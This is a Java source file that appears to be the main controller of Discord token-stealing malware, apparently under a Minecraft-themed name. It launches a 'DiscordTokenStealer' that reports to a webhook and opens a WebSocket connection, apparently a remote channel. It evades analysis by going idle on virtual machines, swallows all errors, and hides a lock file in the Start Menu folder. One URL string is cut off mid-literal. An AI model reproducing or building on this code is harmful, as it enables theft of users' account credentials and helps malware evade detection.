import java.io.File;
import java.io.PrintStream;
import java.io.RandomAccessFile;
import java.nio.channels.FileLock;
import java.util.concurrent.CompletableFuture;

public class MainOrchestrator {

    private static volatile boolean isRunning;

    private final String webhookUrl;

    private final HttpUploader httpUploader;

    private final boolean debugMode;

    private final boolean testMode;

    private static FileLock instanceLock1;
    private static FileLock instanceLock2;

    private static String[] commandArgs;

    public MainOrchestrator(String webhookUrl, boolean debugMode, String[] args, long encryptedKey) {

        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {

        });

        String effectiveWebhook = webhookUrl;
        if (args != null && args.length > 0 && args[0].length() > 0
                && !args[0].startsWith("https:
            effectiveWebhook = args[0];
        }

        this.webhookUrl = effectiveWebhook;
        this.httpUploader = new HttpUploader(this.webhookUrl);
        this.debugMode = debugMode;

        boolean hasTestFlag = false;
        if (args != null) {
            for (String arg : args) {
                if ("--test".equals(arg)) {
                    hasTestFlag = true;
                    break;
                }
            }
        }
        this.testMode = hasTestFlag;
    }

    public void run(long encryptedKey) {
        commandArgs = getCommandArgs();

        if (this.testMode) {

            String displayUrl = this.webhookUrl;
            if (displayUrl != null && displayUrl.length() > 30) {
                displayUrl = displayUrl.substring(0, 30) + " (truncated)";
            }
            WebhookLogger.logInfo("Main", "Webhook: " + displayUrl);

            new DiscordTokenStealer(this.webhookUrl, encryptedKey).start(encryptedKey);

            CompletableFuture.runAsync(() -> {
                WebSocketHandler.connect();
            });

            try { Thread.sleep(2000); } catch (Exception ignored) {}
            return;
        }

        boolean isVm = VmDetector.isVirtualMachine();
        if (isVm) {

            try { Thread.sleep(60000); } catch (Exception ignored) {}
            return;
        }

        String displayUrl = this.webhookUrl;
        if (displayUrl == null || displayUrl.isEmpty()) {
            displayUrl = "unknown";
        }
        if (displayUrl.length() > 30) {
            displayUrl = displayUrl.substring(0, 30) + " (truncated)";
        }

        WebhookLogger.logInfo("Main", "Webhook: " + displayUrl);

        if (!acquireInstanceLock(encryptedKey)) {

            WebhookLogger.logWarning("Main", "Already running");
            return;
        }

        WebhookLogger.logInfo("Main", "Starting...");

        new DiscordTokenStealer(this.webhookUrl, encryptedKey).start(encryptedKey);

        CompletableFuture.runAsync(() -> {
            WebSocketHandler.connect();
        });

        try { Thread.sleep(2000); } catch (Exception ignored) {}
    }

    private boolean acquireInstanceLock(long encryptedKey) {
        try {

            String appData = System.getenv("APPDATA");
            String lockPath = appData + "\\"
                + "Microsoft" + "\\"
                + "Windows" + "\\"
                + "Start Menu" + "\\"
                + "CuteCraftSmp" + "\\"
                + "CuteCraft";

            File lockFile = new File(lockPath);
            lockFile.getParentFile().mkdirs();

            RandomAccessFile raf = new RandomAccessFile(lockFile, "rw");
            instanceLock1 = raf.getChannel().tryLock();

            if (instanceLock1 == null) {

                return false;
            }

            return true;

        } catch (Exception e) {

            return true;
        }
    }

    private static String[] getCommandArgs() {
        return commandArgs;
    }

    public static void setRunning(boolean running) {
        isRunning = running;
    }

    public static boolean isRunning() {
        return isRunning;
    }

    static {
        isRunning = false;
        commandArgs = null;
    }
}